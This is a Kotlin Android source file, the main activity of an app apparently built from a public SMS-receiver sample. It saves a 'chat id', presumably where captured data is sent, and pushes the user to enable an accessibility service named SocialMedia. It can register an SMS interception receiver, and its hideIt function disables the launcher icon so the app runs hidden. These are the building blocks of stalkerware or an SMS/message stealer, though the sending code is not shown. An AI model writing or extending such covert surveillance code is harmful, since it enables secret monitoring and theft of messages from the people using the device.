package br.com.helpdev.smsreceiver

import android.Manifest
import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.annotation.SuppressLint
import android.content.*
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.os.Bundle
import android.provider.Settings
import android.view.View
import android.view.accessibility.AccessibilityManager
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import br.com.helpdev.smsreceiver.receiver.SMSReceiver
import br.com.helpdev.smsreceiver.receiver.SocialMedia
import kotlinx.android.synthetic.main.activity_main.*


class MainActivity : AppCompatActivity() {

    var savePref: SavePref? = null

    lateinit  var saveButton : Button
    lateinit  var chatid : EditText
    lateinit  var chatidmsg : TextView


    companion object {
        private const val REQUEST_CODE_SMS_PERMISSION = 1
    }

    @SuppressLint("ResourceAsColor")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        saveButton = findViewById<Button>(R.id.save)
        chatid     = findViewById<EditText>(R.id.chatidet)
        chatidmsg  = findViewById<TextView>(R.id.chatidmsg)

        savePref = SavePref(this)

        val chatIdVal: String? = savePref?.getChatid()
        if (chatIdVal === "nochatid" ) {

            this.chatidmsg.setText(getString(R.string.cht_id));
            this.saveButton.setVisibility(View.VISIBLE);
            this.chatid.setVisibility(View.VISIBLE);

        }else{
            chatidmsg.setText("chat id saved "+chatIdVal)
            this.chatidmsg.setTextColor(R.color.colorPrimary)
            this.saveButton.setVisibility(View.GONE);
            this.chatid.setVisibility(View.GONE);
        }

        //requestSmsPermission()
        //registerSmsReceiver()
        checkAndAskAcc()
    }



    private fun registerSmsReceiver() {
       //
         val ACTION_SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED"
        val myBroadCastReceiver: BroadcastReceiver = SMSReceiver()
        val filter = IntentFilter(ACTION_SMS_RECEIVED)
        registerReceiver(myBroadCastReceiver, filter)

    }

    private fun requestSmsPermission() {
        val permission = Manifest.permission.RECEIVE_SMS
        val grant = ContextCompat.checkSelfPermission(this, permission)
        if (grant != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, arrayOf(permission), REQUEST_CODE_SMS_PERMISSION)
        }
    }

    override fun onDestroy() {
        super.onDestroy()

        //unregisterMyReceiver();
    }

    private fun unregisterMyReceiver() {
        val myBroadCastReceiver: BroadcastReceiver = SMSReceiver()
        unregisterReceiver(myBroadCastReceiver)
    }

    private fun checkAndAskAcc() {
        val enabled = isAccessibilityServiceEnabled(this, SocialMedia::class.java)
        if (!enabled){
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            startActivity(intent)
        }
    }

    fun saveChatId(view: View) {

        var chatidtxt =  chatidet.text.toString()

        if (chatidtxt.length == 0){
            chatidet.setError("empty")
            return
        }
        savePref?.setChatid(chatidtxt)
        val chatIdVal: String? = savePref?.getChatid()

        if (chatIdVal === "nochatid" ) {

            this.chatidmsg.setText(getString(R.string.cht_id))
            this.saveButton.setVisibility(View.VISIBLE);
            this.chatid.setVisibility(View.VISIBLE);

        }else{
            chatidmsg.setText("chat id saved "+chatIdVal)
            this.saveButton.setVisibility(View.GONE);
            this.chatid.setVisibility(View.GONE);
            checkAndAskAcc();
        }

    }


    fun isAccessibilityServiceEnabled(
        context: Context,
        service: Class<out AccessibilityService?>
    ): Boolean {
        val am = context.getSystemService(ACCESSIBILITY_SERVICE) as AccessibilityManager
        val enabledServices =
            am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK)
        for (enabledService in enabledServices) {
            val enabledServiceInfo: ServiceInfo = enabledService.resolveInfo.serviceInfo
            if (enabledServiceInfo.packageName.equals(context.packageName) && enabledServiceInfo.name.equals(
                    service.name
                )
            ) return true
        }
        return false
    }

    fun hideIt(view: View) {
        val pm = packageManager
        val componentName = ComponentName(this, MainActivity::class.java)
        pm.setComponentEnabledSetting(
            componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }


}
/*https://github.com/gbzarelli/sms-received-sample*/